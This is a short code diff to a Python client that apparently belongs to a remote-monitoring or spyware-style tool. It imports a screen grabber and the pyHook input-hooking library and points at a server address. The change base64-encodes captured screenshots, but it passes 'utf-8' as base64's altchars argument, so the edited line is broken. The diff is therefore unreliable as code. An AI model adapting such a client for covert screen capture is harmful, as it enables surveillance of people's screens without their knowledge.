@@ -3,6 +3,7 @@ from threading import Thread
 from PIL import ImageGrab
 import time
 import pyHook
+import base64
 
 
 SERVER_IP = "127.0.0.1"
@@ -113,7 +114,7 @@ class ClientFunctions(object):
         import StringIO
         string_io = StringIO.StringIO()
         ImageGrab.grab().save(string_io, "JPEG")
-        return string_io.getvalue()
+        return base64.b64encode(string_io.getvalue(), 'utf-8')
 
 
 class ClientData(object):
